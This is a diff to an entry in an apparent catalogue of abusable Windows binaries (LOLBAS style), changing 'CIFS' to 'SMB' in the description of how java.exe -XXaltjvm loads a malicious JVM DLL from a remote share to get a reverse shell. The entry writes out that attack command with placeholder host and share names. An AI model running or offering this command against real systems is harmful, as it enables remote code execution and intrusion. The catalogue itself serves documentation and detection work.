@@ -5,8 +5,8 @@ Author: 'Gianluca Palma (piuppi)'
 Created: 2022-07-04
 Commands:
   - Command: java.exe -XXaltjvm=\\IP-ADDRESS\SHARE-NAME-THAT-CONTAINS-A-MALICIUS-JVM.DLL
-    Description: Allows an alternative JavaVM library to be loaded from a CIFS share.
-    Usecase: Allows loading an alternative JavaVM library from a CIFS share to establish a Reverse Shell.
+    Description: Allows an alternative JavaVM library to be loaded from a SMB share.
+    Usecase: Allows loading an alternative JavaVM library from a SMB share to establish a Reverse Shell.
     Category: Execute
     Privileges: User
     MitreID:
@@ -22,7 +22,7 @@ Detection:
   - IOC:
 Resources:
   - Link: https://threatpost.com/serious-new-java-flaw-affects-all-current-versions-windows-040910/73804/
-  - Link: https://github.com/piuppi/Proof-of-Concepts/blob/main/Misc/loading-alternative-JavaVM-from-CIFS-share.md
+  - Link: https://github.com/piuppi/Proof-of-Concepts/blob/main/Misc/loading-alternative-JavaVM-from-SMB-share.md
 Acknowledgement:
   - Person: 'Tavis Ormandy'
     Handle:
